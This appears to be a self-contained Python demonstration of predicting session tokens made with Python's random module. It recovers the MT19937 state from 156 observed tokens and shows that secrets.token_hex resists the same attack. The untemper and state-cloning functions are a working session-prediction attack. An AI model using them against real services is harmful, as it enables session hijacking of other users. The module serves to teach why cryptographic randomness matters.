"""Predict the next session token generated with Python's `random` module.

    python -m attacks.predict_tokens

Scenario: a portal issues 128-bit hex session tokens with
"%032x" % random.getrandbits(128). No fixed seed, no time seed: CPython seeds
`random` from os.urandom at import. The tokens look fine, but the generator
is MT19937, whose output is a reversible ("tempered") copy of its internal
state. Each token is four 32-bit outputs, so 156 tokens give the attacker
624 outputs, which is the whole state. After that every future token is known.

The attacker here only uses tokens it was legitimately given (for example by
logging in repeatedly with its own account). It never sees the seed.

Running the same attack against secrets.token_hex(16) predicts nothing.
"""

from __future__ import annotations

import random
import secrets

MT_STATE_WORDS = 624
WORDS_PER_TOKEN = 4                                   # 128 bits / 32
TOKENS_NEEDED = MT_STATE_WORDS // WORDS_PER_TOKEN     # 156


def _undo_xor_rshift(y: int, shift: int) -> int:
    result = y
    for _ in range(32 // shift + 1):
        result = y ^ (result >> shift)
    return result & 0xFFFFFFFF


def _undo_xor_lshift_mask(y: int, shift: int, mask: int) -> int:
    result = y
    for _ in range(32 // shift + 1):
        result = y ^ ((result << shift) & mask)
    return result & 0xFFFFFFFF


def untemper(y: int) -> int:
    """Invert MT19937's output tempering to get back one word of state."""
    y = _undo_xor_rshift(y, 18)
    y = _undo_xor_lshift_mask(y, 15, 0xEFC60000)
    y = _undo_xor_lshift_mask(y, 7, 0x9D2C5680)
    y = _undo_xor_rshift(y, 11)
    return y


def token_to_words(token_hex: str) -> list[int]:
    """getrandbits(128) fills the least significant 32 bits first."""
    value = int(token_hex, 16)
    return [(value >> (32 * i)) & 0xFFFFFFFF for i in range(WORDS_PER_TOKEN)]


def clone_from_tokens(observed: list[str]) -> random.Random:
    words = [w for t in observed for w in token_to_words(t)]
    if len(words) < MT_STATE_WORDS:
        raise ValueError(f"need {TOKENS_NEEDED} tokens, got {len(observed)}")
    state = [untemper(w) for w in words[-MT_STATE_WORDS:]]
    clone = random.Random()
    clone.setstate((3, tuple(state + [MT_STATE_WORDS]), None))
    return clone


def weak_token(rng=random) -> str:
    return "%032x" % rng.getrandbits(128)


def run(rng=None, predict: int = 10) -> dict:
    """Observe 156 weak tokens, predict the next `predict`, then compare."""
    rng = rng or random.Random()            # seeded from os.urandom, like the module default
    observed = [weak_token(rng) for _ in range(TOKENS_NEEDED)]
    clone = clone_from_tokens(observed)
    predicted = [weak_token(clone) for _ in range(predict)]
    actual = [weak_token(rng) for _ in range(predict)]

    strong_observed = [secrets.token_hex(16) for _ in range(TOKENS_NEEDED)]
    strong_clone = clone_from_tokens(strong_observed)
    strong_predicted = [weak_token(strong_clone) for _ in range(predict)]
    strong_actual = [secrets.token_hex(16) for _ in range(predict)]

    return {
        "observed": TOKENS_NEEDED,
        "predicted": predict,
        "weak_correct": sum(p == a for p, a in zip(predicted, actual)),
        "strong_correct": sum(p == a for p, a in zip(strong_predicted, strong_actual)),
        "example_predicted": predicted[0],
        "example_actual": actual[0],
    }


def main() -> None:
    r = run()
    print(f"observed {r['observed']} tokens from random.getrandbits(128)")
    print(f"  predicted next token : {r['example_predicted']}")
    print(f"  actual next token    : {r['example_actual']}")
    print(f"  correct predictions  : {r['weak_correct']}/{r['predicted']}")
    print(f"same attack on secrets.token_hex(16): {r['strong_correct']}/{r['predicted']}")


if __name__ == "__main__":
    main()
